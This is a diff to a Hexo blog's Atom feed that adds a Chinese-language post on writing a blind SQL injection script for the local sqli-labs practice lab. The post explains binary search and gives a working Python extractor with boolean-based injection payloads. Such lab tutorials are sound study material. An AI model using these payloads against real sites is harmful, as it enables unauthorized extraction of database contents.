@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-05-21T10:39:21.572Z</updated>
+  <updated>2019-06-12T16:54:15.998Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Sqli-labs 盲注脚本编写</title>
+    <link href="http://yoursite.com/2019/06/13/Sqli-labs%20%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
+    <id>http://yoursite.com/2019/06/13/Sqli-labs 盲注脚本编写/</id>
+    <published>2019-06-12T16:54:13.000Z</published>
+    <updated>2019-06-12T16:54:15.998Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h2><p>1.初始化<br>设置数组范围，猜英文字符通常32~127，猜表长度通常50<br>2.当low&lt;=high进入循环<br>计算mid值，需要换算成整型<br>当所猜数小于mid<br>high指针左移为mid-1<br>当所猜数大于mid<br>low指针左移位mid+1<br>当low&gt;high时<br>输出list[high]则为最终结果</p><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>1.思路<br>构造payload：所猜数&lt;mid<br>判断条件，字符串如果在html中，那么就左移位，反之右移位<br>2.编写<br>先获得数据长度值，在根据长度获取具体值<br>我是编写两个函数<br>一个函数用来二分法求值，可求长度，或单个字符<br>第二个函数用来整合获取数据，循环每位字符得到字符串</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>python进行%赋值时，需要将%转义，二次%赋值尤其注意<br>如<code>%23</code>要变成<code>%%23</code></p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"># payload: ?id=1&apos; and ascii(substr(database(),1,1))&gt;0 %23</span><br><span class="line"># len: ?id=1&apos; and length(database())&gt;0 %23</span><br><span class="line"># (select schema_name from information_schema.schemata limit 0,1)</span><br><span class="line">url = &quot;http://127.0.0.1/jishu1/sqli-labs-master/Less-5/&quot;;</span><br><span class="line">payload_len = &quot;?id=1&apos; and length(database())&lt;%d %%23&quot;</span><br><span class="line">payload = &quot;?id=1&apos; and ascii(substr(database(),%d,1))&lt;%%d %%%%23&quot;</span><br><span class="line">true_str = &quot;You are in&quot;</span><br><span class="line"></span><br><span class="line">html = requests.get(&quot;http://127.0.0.1/jishu1/sqli-labs-master/Less-5/?id&quot;)</span><br><span class="line"></span><br><span class="line">def getOneData(payload,flag=1):</span><br><span class="line">if flag==1:</span><br><span class="line">list = range(50)</span><br><span class="line">else:</span><br><span class="line">list = range(32,127)</span><br><span class="line">low = 0</span><br><span class="line">high = len(list)-1</span><br><span class="line">while low&lt;=high:</span><br><span class="line">mid = (int)((low+high)/2)</span><br><span class="line">guess = list[mid]</span><br><span class="line">print(list[low],guess,list[high])</span><br><span class="line">html = requests.get(url+payload % guess).text</span><br><span class="line">if true_str in html:</span><br><span class="line">high = mid - 1</span><br><span class="line">else:</span><br><span class="line">low = mid + 1</span><br><span class="line">if low &gt; high:</span><br><span class="line">return list[high]</span><br><span class="line"></span><br><span class="line">def getFlag(length,payload):</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">for l in range(1,length+1):</span><br><span class="line">payload2 = payload % l</span><br><span class="line">result += chr(getOneData(payload2,2))</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">getFlag(getOneData(payload_len),payload)</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;二分法&quot;&gt;&lt;a href=&quot;#二分法&quot; class=&quot;headerlink&quot; title=&quot;二分法&quot;&gt;&lt;/a&gt;二分法&lt;/h2&gt;&lt;p&gt;1.初始化&lt;br&gt;设置数组范围，猜英文字符通常32~127，猜表长度通常50&lt;br&gt;2.当low&amp;lt;=high进入循环&lt;br&gt;计
+      
+    
+    </summary>
+    
+      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
+    
+    
+      <category term="Web" scheme="http://yoursite.com/tags/Web/"/>
+    
+  </entry>
   
   <entry>
     <title>BeautifulSoup解析</title>
